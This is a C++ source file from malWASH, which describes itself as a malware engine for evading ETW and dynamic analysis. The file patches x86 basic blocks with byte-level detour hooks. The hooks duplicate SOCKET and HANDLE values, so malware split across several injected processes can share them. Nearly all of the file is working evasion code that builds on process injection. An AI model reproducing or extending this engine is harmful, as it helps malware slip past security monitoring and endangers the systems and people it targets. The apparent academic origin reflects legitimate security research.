//-----------------------------------------------------------------------------------------------------------
/*
**  malWASH - The malware engine for evading ETW and dynamic analysis: A new dimension in APTs 
**
**  ** The splitting engine ** - Version 2.0
**
**
**	dup.cpp
**
**	This file contains code for dealing with duplicated SOCKETs and HANDLEs. Most of the job is done on
**	executer, but we have to setup the basic structure here.
**
**
**	Kyriakos Ispoglou (ispo) - ispo@purdue.edu
**  June - July 2015 
*/
//-----------------------------------------------------------------------------------------------------------
#include "malwash.h"										// all includes are here


//-----------------------------------------------------------------------------------------------------------
/*
**	crthook(): Create a hook function (detour) to the call/jmp to the imported modules. The role of the hook
**		function is double:
**		[1]. If SOCKET/HANDLE is used as return value, we have to insert it in duptab of the executer and we
**			 inform the other injected processes to call WSADuplicateSocket/DuplicateHandle.
**		[2]. If SOCKET/HANDLE is used as the i-th argument, we have to replace it with the duplicated one 
**			 before call to the actual function.
**
**	NOTE: We can avoid hooks and insert extra code in the middle of block instead. This solution will work
**		when we have a basic block split (as there are no relative jumps within blocks). However if we use 
**		a different splitting mode and each block consist of many basic blocks, this approach won't work.
**
**	NOTE2: We cannot handle trampoline function calls
**.
**	Arguments:  blk       (uchar*)     : Block opcodes
**              blkcnt    (uint)       : Block size
**              duptab    (dup_t*)     : A pointer to duptab
**              dupcnt    (uint)       : # of duptab entries
**              funcrel   (funcrel_t*) : A pointer to funcrel
**              funrelcnt (uint)       : # of funcrel entries
**
**	Return Value: Function returns constant ANY. If an error occured, it returns -1
*/
uint crthook( uchar blk[], uint *blkcnt, dup_t duptab[], uint dupcnt, funcrel_t funcrel[], uint funrelcnt )
{
// redefine these MACROS
#define PBYTE1(b)          (blk[(*blkcnt)++] = (b) & 0xff)	// append a single byte to blk array
#define PLONG(l)           *(uint*)(blk + *blkcnt) = (l); *blkcnt += 4	// append a 4 byte integer to blk array
#define PBYTE2(a, b)	   PBYTE1(a); PBYTE1(b)				// append 2 bytes to blk array
#define PBYTE3(a, b, c)	   PBYTE2(a, b); PBYTE1(c)			// append 3 bytes to blk array
#define PBYTE4(a, b, c, d) PBYTE3(a, b, c); PBYTE1(d)		// append 4 bytes to blk array
#define SET_EBX(target)    PBYTE1(0xBB); PLONG(target)		// write the instruction mov ebx, _long_

// this MACRO changes a function relocation offset from and old (o) to a new (n) value:	
#define movreloff(o, n)              \
    for(uint i=0; i<funrelcnt; i++ ) \
        if( funcrel[i].boff == (o) ) \
		{                            \
            funcrel[i].boff = (n);   \
            break;                   \
		} 

	ushort	jmpoff = *blkcnt;								// store current block size


	if( dupcnt == 0 ) return SUCCESS;						// if there's no need for duplications, exit
	
	
	// reserve 5 bytes for adding a relative far jump to skip function definitions.
	// (we can add a relative near jump (1 byte offset) but it's dangerous)
	*blkcnt += 5;

	for(uint d=0; d<dupcnt; d++ )							// for each entry in duptab
	{		
		if( blk[duptab[d].boff + 1] != 0x15 )				// we consider only indirect calls
		{
			// we have an indirect jump to imported library.
			// we can handle it by doing exactly the same thing with indirect jumps in patchblk().
			// however because we'll end up with large code snippets, we won't handle in this version
			fatal( "Current version cannot duplicate trampoline HANDLE/SOCKET functions" );

			return ERROR;									// abort
		}

		if( (duptab[d].loc & 0xff) == 0 )					// duplicate return value?
		{
			//
			// In such cases, we have a call to a function that returns a SOCKET/HANDLE:
			//		.text:0041185C 52                   push    edx
			//		.text:0041185D FF 15 8C A4 41 00    call    ds:__imp__socket@12
			//		.text:00411863 89 85 6C FE FF FF    mov     [ebp+sock], eax
			// 
			// We replace the function call with a nop (1 byte) + a relative jump to hook (5 bytes):
			//		e9 ?? ?? 00 00          jmp   +???? <hook> 
			// (we don't use a call because this will modify the stack and the 1st argument won't be
			//	in esp+4 anymore).
			//
			// We store the hook at the end of the normal basic block. The first job of the hook is
			// to execute the replaced instruction call/jmp.
			// After call, eax will contain the SOCKET/HANDLE value. Then we call a function that is
			// responsible for inserting the handle in the duplicate's table, duplicating it and informing
			// other processes to use the duplicated handle.
			// However we don't know the address of this function and we have to resolve it at runtime.
			// Thus we insert a call but we leave the address empty. Note that this call should return the 
			// original SOCKET/HANDLE value. After this call we jump to the instruction right after the call 
			// to the hook. In the above example, the code will be changed to:
			//
			//		seg000:0000002F 52                    push    edx
			//		seg000:00000030 90                    nop
			//		seg000:00000031 E9 3F 00 00 00        jmp     loc_75
			//		seg000:00000036                   loc_36:
			//		seg000:00000036 89 85 6C FE FF FF     mov     [ebp-194h], eax
			//		...
	   		//		seg000:00000075                   loc_75:
			//		seg000:00000075 FF 15 8C A4 41 00     call    dword ptr ds:41A48Ch	; ds:__imp__socket@12
			//		seg000:0000007B E8 90 90 90 90        call    near ptr 90909110h
			//		seg000:00000080 E9 B1 FF FF FF        jmp     loc_36
			//
			// NOTE: we can also handle this: jmp  ds:__imp__socket@12
			//
			ushort	imploc = *blkcnt + 2,					// new offset of call to the imported module
					duprepl;								// offset of the unknonw dup* function


			msg( "        [+] Creating a hook function for return value at offset %d\n", duptab[d].boff);

			memcpy(&blk[*blkcnt], &blk[duptab[d].boff], 6);	// move call/jmp instr. to the end of the block

			blk[ duptab[d].boff ] = 0x90;					// nop
			blk[duptab[d].boff+1] = 0xe9;					// jump + find the offset
			*(uint*)(blk + duptab[d].boff + 2) = (*blkcnt - duptab[d].boff - 6);
			*blkcnt += 6;									// increase counter

			duprepl = *blkcnt + 1;							// get offset of dup* function call
			PBYTE1( 0xe8 );									// call
			PLONG( 0x90909090 );							// we can use this space to store info
															//
			PBYTE1( 0xe9 );									// jump back to the instruction after hook
			PLONG( -(int)(*blkcnt - duptab[d].boff - 2) );	// 

			// because we moved a call to an imported module, we have to update the offset in funcrel
			// table. Otherwise we'll try to relocate a function at the wrong offset
			movreloff(duptab[d].boff+2, imploc);

			duptab[d].boff = duprepl;						// boff now points to unknown dup* function	
		}
		else {  											// duplicate an argument?
			//
			// Now, we have a call/jmp to a function that takes a SOCKET/HANDLE as argument:
			//		.text:00411883 51                   push    ecx
			//		.text:00411884 FF 15 88 A4 41 00    call    ds:__imp__connect@12
			//		.text:0041188A 83 F8 FF             cmp     eax, 0FFFFFFFFh
			//
			// We replace the function call with a nop (1 byte) + a relative call to hook (5 bytes):
			//		e8 ?? ?? 00 00          call   +???? <hook> 
			//
			// This time, the first job of the hook, is to read the argument that needs to be duplicated 
			// and call a function from dup* family to find the right duplicated SOCKET/HANDLE for this 
			// process. Then we have to replace the original argument with the duplicated one.
			// Finally we jump to the imported module (instead of call). Once we execute a "retn" inside
			// the imported module, we'll return to the instruction after the call. Let's see how the above
			// example becomes:
			//
			//		seg000:00000056 51                    push    ecx
			//		seg000:00000057 90                    nop
			//		seg000:00000058 E8 28 00 00 00        call    sub_85
			//		seg000:0000005D 83 F8 FF              cmp     eax, 0FFFFFFFFh
			//		...
		    //		seg000:00000085                   sub_85 proc near
			//		seg000:00000085 8B 44 24 04           mov     eax, [esp - 0x04]	
			//		seg000:00000089 E8 90 90 90 90        call    near ptr 9090911Eh
			//		seg000:0000008E 89 44 24 04           mov     [esp - 0x04], eax 
			//		seg000:00000092 FF 25 88 A4 41 00     jmp     dword ptr ds:41A488h ; ds:__imp__connect@12
			//
			ushort	duprepl;								// offset of the unknonw dup* function


			msg( "        [+] Creating a hook function for argument %d at offset %d\n", 
					duptab[d].loc & 0xff, duptab[d].boff);

			// insert a: "mov eax, DWORD PTR [esp+0x?]" (8b 44 24 0?) to read thea argument that needs to
			// be duplicated. ? is the argument location*4
			PBYTE4( 0x8B, 0x44, 0x24, (duptab[d].loc & 0xff) << 2 );

			duprepl = *blkcnt + 1;							// get offset of dup* function call
			PBYTE1( 0xe8 );									// call
			PLONG( 0x90909090 );							// we can use this space to store info
		
			// after call, replace the argument with the duplicated one: 
			// "mov DWORD PTR [esp+0x?], eax" (89 44 24 0?)
			PBYTE4( 0x89, 0x44, 0x24, (duptab[d].loc & 0xff) << 2 );

			memcpy(&blk[*blkcnt], &blk[duptab[d].boff], 6);	// move call in the hook

			// Convert call to jump (indirect jump and indirect call differ only in 2nd byte:
			//		FF 25 B8 A3 41 00    jmp     ds:__imp__memset                     ; 5
			//		FF 15 88 A4 41 00    call    ds:__imp__connect@12
			blk[ (*blkcnt) + 1] = 0x25;						// convert call to jmp

			blk[ duptab[d].boff ] = 0x90;					// nop
			blk[duptab[d].boff+1] = 0xe8;					// call
			// find the call offset: 
			//	4 bytes for: mov eax, DWORD PTR [esp+0x?]
			//  5 bytes for call to dup* function
			//  4 bytes for: mov DWORD PTR [esp+0x?], eax
			//  6 bytes for indirect jump to imported moodule
			*(uint*)(blk + duptab[d].boff + 2) = (*blkcnt - duptab[d].boff - 4 - 5 - 4 - 6);


			movreloff(duptab[d].boff+2, *blkcnt + 2);		// update function relocation
			duptab[d].boff = duprepl;						// boff now points to unknown dup* function	
			
			*blkcnt += 6;									// adjust block size
		}
	}

	// we insert hooks at the end of basic block. We have to finish basic block with a jump to skip hooks:
	blk[ jmpoff ] = 0xe9;									// jump
	*(uint*)(blk + jmpoff + 1) = (*blkcnt - jmpoff - 5);	// find offset (5 = jump size)

	return SUCCESS;											// return

#undef SET_EBX												// undefine MACROS
#undef PBYTE4
#undef PBYTE3
#undef PBYTE2
#undef PLONG
#undef PBYTE1
}
//-----------------------------------------------------------------------------------------------------------
/*
**	dupchk(): This function checks whether an imported function from a module uses a SOCKET or a HANDLE. 
**		Because subsequent blocks of the splitted program will be in different processes, we'll have 
**		troubles. If process 1 open a socket, then process 2 cannot write to it. Fortunately, functions
**		WSADuplicateSocket() and DuplicateHandle() can solve this problem.
**		IDA helps us for one more type. When we have a call/jmp to an imported module, the first data xref
**		from this address, will always point to an entry inside IAT. By reading the type of this entry we
**		identify the imported function declaration with high detail. For instance:
**			SOCKET __stdcall socket(int af, int type, int protocol)
**		From the above string it's very easy to see if and which arguments (or the return value) use a 
**		socket. Thus we can avoid having a huge list of all function that use socket/handles and check each 
**		imported function against this list to see if the latter uses any socket/handles.
**
**	Arguments:  iaddr (ea_t) : Address of the instruction that transfers control to the imported module
**
**	Return Value: If any errors occured, the return value is -1. Otherwise function returns a 16bit number
**		The 8 LSBits of this number denote the location of the argument whereas the 8 MSBitd the duplication
**		type (0 for HANDLE, or 1 for SOCKET).
*/
uint dupchk( ea_t iaddr )
{
	type_t	buf    [MAXIMPFUNDECLLEN];						// the first 3 buffers are auxilary
	p_list	fnames [MAXIMPFUNDECLLEN];						// 
	char	type   [MAXIMPFUNDECLLEN],						//
			fundecl[MAXIMPFUNDECLLEN];						// this buffer contains the function declaration
	ea_t	iat_addr;										// address of function in IAT
	ushort	duploc, done;									// local vars
	uint	retval = ANY;									// return value

	iat_addr = get_first_dref_from(iaddr);					// get address of function entry in IAT

	// get type information (to arrays buf and fnames)
	// WARNING: get_ti is DERPECATED
	get_ti(iat_addr, buf, MAXIMPFUNDECLLEN,  fnames, MAXIMPFUNDECLLEN );

	// print type into 1 signle line (merge buf and fnames to produce type)
	print_type_to_one_line(type, MAXIMPFUNDECLLEN, idati, buf, NULL, NULL, fnames, NULL);

	// convert type to a normal char* string
	strcpy_s(fundecl, MAXIMPFUNDECLLEN, qstrdup(type));

	// at this point funcdecl contains the full function declaration (without function name). For example
	// function declaration: 
	//		int __stdcall LoadStringW(HINSTANCE hInstance, UINT uID, LPWSTR lpBuffer, int cchBufferMax)
	// will give us the string:
	//		int __stdcall(HINSTANCE hInstance, UINT uID, LPWSTR lpBuffer, int cchBufferMax)
	msg( "    [*] Getting imported function declaration: %s\n", fundecl );	
	

	duploc = 0;												// clear iterator
	done   = 0;												// not trampolines created so far

	// now, parse the arguments and search for SOCKET or HANDLE arguments
	// we'll use secure version of strtok, to get all tokens from function declaration. Delimiters are: '('
	// ')' and ','. The first token will be the return type followed by calling convention. Then next tokens
	// will be the function arguments (type [space] name).
	for( char *nxttok, *token=strtok_s(fundecl, "(),", &nxttok); token!=NULL; 
						token=strtok_s(NULL,    "(),", &nxttok), ++duploc
	   )
    {
		char	func[MAXFUNAMELEN] = {0};						// store function name here


		// because there's a space after delimiter ',', all arguments after 1st will start with a space.
		// Remove it.
		if( token[0] == ' ' ) token++;
            
		
		if( strstr(token, "SOCKET") != NULL )				// SOCKET as argument?
		{
			// It's very rare to find a function that uses both a handle and a socket. We don't
			// consider such cases here, although it's not way harder to have trampoline functions
			// that handle many duplicated arguments
			if( ++done > 1 ) {
				fatal("Current version does not create hooks with >1 SOCKET/HANDLE arguments");
				return ERROR;
			}

			// Special Case when function is closesocket()
			get_name(BADADDR, iat_addr, func, MAXFUNAMELEN);// get name of address from .idata

			if( strstr(func, "closesocket") )				// closesocket() is called?
			{
				retval = (CLOSESOCK << 8) | duploc;			// set return value
			}
			else retval = (DUPSOCK << 8) | duploc;			// set return value
		}
		else if( strstr(token, "HANDLE") != NULL )			// HANDLE as argument?
		{
			if( ++done > 1 ) {
				//fatal("Current version does not create hooks with >1 SOCKET/HANDLE arguments");
				//return ERROR;
				continue;
			}

			// Special Case when function is CloseHandle()
			get_name(BADADDR, iat_addr, func, MAXFUNAMELEN);// get name of address from .idata
			
			if( strstr(func, "CloseHandle") )				// CloseHandle() is called?
			{
				retval = (CLOSEHANDLE << 8) | duploc;		// set return value
			}
			else retval = (DUPHANDLE << 8) | duploc;		// set return value
		}
    }
	
	if( retval != ANY ) {
		msg( "    [-] Registering a hook function at %x. Duplicating %s at argument #%d\n", 
			iaddr, ((retval >> 8) == DUPSOCK ? "SOCKET" : "HANDLE"), retval & 0x7FFF );
	}

	return retval;											// return type + location 
}
//-----------------------------------------------------------------------------------------------------------
